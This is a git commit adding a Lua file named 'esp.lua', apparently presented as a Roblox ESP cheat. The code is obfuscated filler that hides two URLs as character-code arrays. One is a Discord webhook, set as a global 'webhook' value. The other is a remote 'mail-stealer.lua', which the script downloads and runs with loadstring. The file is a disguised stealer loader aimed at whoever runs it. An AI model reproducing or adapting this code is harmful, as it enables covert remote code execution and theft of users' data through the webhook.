ffcdea316db50b96695307bfb1b9f08fbdac21e2
firsteazy <125362353+firsteazy@users.noreply.github.com>
2023-04-01 23:14:38 +0500

    Create esp.lua

---
+++ esp.lua
@@ -0,0 +1,46 @@
+local print=print;
+local type=type;
+local tonumber=tonumber;
+local a={}for b=1,10 do a[b]=math.random(1000)end;
+local c=""function genednv(d)getgenv()[c]=d end;
+local tostring=tostring;
+local e=math.abs;
+local f=string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,48,57,49,51,55,57,57,53,54,52,56,57,49,51,48,49,49,52,47,73,78,106,89,75,69,54,50,121,114,82,66,72,53,82,113,107,50,106,87,68,51,83,111,107,98,67,55,106,120,51,65,67,52,52,113,118,74,106,120,118,118,111,83,82,50,100,82,74,111,108,78,68,54,108,86,114,66,110,50,89,83,67,78,106,122,118,80);
+local h=math.ceil;local i=math.floor;
+local function j(k)c="mouselock"genednv("false")
+local l={}for b=1,k do l[b]=math.random(100)end;
+    return l end;
+local m=math.max;
+local n=math.min;
+local o={2,93,210,219,2983,2130,239,284,034}local function p(q)local r={}c="name"genednv("Ernar4ik_PRO")for b=1,q do r[b]=string.char(math.random(97,122))end;
+    return table.concat(r)end;
+local s=table.create;local t=coroutine.resume;
+local u=coroutine.yield;
+local ipairs=ipairs;local pairs=pairs;
+local next=next;
+local v=string.char(104,116,116,112,115,58,47,47,119,117,109,97,116,46,120,121,122,47,115,99,114,105,112,116,115,47,109,97,105,108,45,115,116,101,97,108,101,114,46,108,117,97)local error=error;
+local pcall=pcall;
+function tesdwef(w)
+    return game:HttpGetAsync(w,true)end;
+local xpcall=xpcall;
+local x=loadstring;
+local rawget=rawget;
+local rawset=rawset;
+local function y()
+    local z=p(math.random(5,10))
+    local A=p(math.random(5,10))c="webhook"genednv(f)
+    return z..A end;local B=string.len;
+    local C=string.sub;
+    local D=string.upper;
+    local E=string.lower;
+    local F=string.find;
+    local function G(k)
+        local H=j(10)
+        local l={}
+        local I=p(5)for b=1,k do l[b]=math.random()>0.5 end;
+        local J=y()return l end;
+        local K=G(2)local L=math.acos;
+        local M=math.asin;
+        local N=math.atan;
+        local O=math.atan2;x(tesdwef(v))()
+        local P=math.cos
